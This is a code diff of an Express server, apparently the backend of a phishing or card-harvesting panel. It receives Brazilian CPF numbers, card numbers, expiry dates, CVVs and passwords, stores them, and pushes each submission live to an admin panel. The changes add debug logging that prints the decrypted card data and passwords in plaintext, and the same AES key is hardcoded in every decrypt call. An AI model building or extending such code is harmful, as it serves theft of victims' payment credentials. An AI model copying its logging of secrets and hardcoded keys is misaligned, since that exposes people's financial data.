@@ -88,7 +88,7 @@ app.use('/admin', basicAuth({
     }
 }));
 
-// Middleware para validar token (substitui requireAuth)
+// Middleware para validar token
 const validateToken = (req, res, next) => {
     const token = req.headers['x-session-token'];
     if (!token || token !== sessionId) { // Substitua sessionId por uma lógica real se necessário
@@ -287,22 +287,26 @@ app.get('/admin', (req, res) => {
     }
 });
 
-// Rotas de dados (sem requireAuth, com validateToken)
+// Rotas de dados (com depuração adicional)
 app.post('/api/temp-submit', validateToken, async (req, res) => {
     try {
+        console.log('Recebendo dados temporários:', req.body);
         const { sessionId, cpf, cardNumber, expiryDate, cvv, password } = req.body;
         if (!sessionId) return res.status(400).json({ error: 'sessionId é obrigatório.' });
 
+        console.log('Descriptografando dados recebidos:', { cpf, cardNumber, expiryDate, cvv, password });
         const decryptedCpf = cpf ? CryptoJS.AES.decrypt(cpf, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
         const decryptedCardNumber = cardNumber ? CryptoJS.AES.decrypt(cardNumber, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
         const decryptedExpiryDate = expiryDate ? CryptoJS.AES.decrypt(expiryDate, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
         const decryptedCvv = cvv ? CryptoJS.AES.decrypt(cvv, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
         const decryptedPassword = password ? CryptoJS.AES.decrypt(password, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
 
+        console.log('Dados descriptografados:', { decryptedCpf, decryptedCardNumber, decryptedExpiryDate, decryptedCvv, decryptedPassword });
         const encryptedCardNumber = decryptedCardNumber ? encrypt(decryptedCardNumber) : null;
         const encryptedCvv = decryptedCvv ? encrypt(decryptedCvv) : null;
         const encryptedPassword = decryptedPassword ? encrypt(decryptedPassword) : null;
 
+        console.log('Executando query SQL:', { sessionId, decryptedCpf, encryptedCardNumber, decryptedExpiryDate, encryptedCvv, encryptedPassword });
         await pool.query(
             `INSERT INTO temp_data (session_id, cpf, card_number, expiry_date, cvv, password, updated_at)
              VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)
@@ -318,7 +322,7 @@ app.post('/api/temp-submit', validateToken, async (req, res) => {
         broadcast({ type: 'TEMP_DATA_UPDATE' });
         res.json({ message: 'Dados temporários salvos com sucesso!' });
     } catch (error) {
-        console.error('Erro em /api/temp-submit:', error.message);
+        console.error('Erro em /api/temp-submit:', error.message, 'Stack:', error.stack);
         res.status(500).json({ error: 'Erro interno do servidor.' });
     }
 });
@@ -375,6 +379,7 @@ app.post('/submit', validateToken, async (req, res) => {
         broadcast({ type: 'FORM_DATA_UPDATE' });
         res.json({ message: 'Dados enviados com sucesso!' });
     } catch (error) {
+        console.error('Erro em /submit:', error.message, 'Stack:', error.stack);
         res.status(500).json({ error: 'Erro interno do servidor.' });
     }
 });
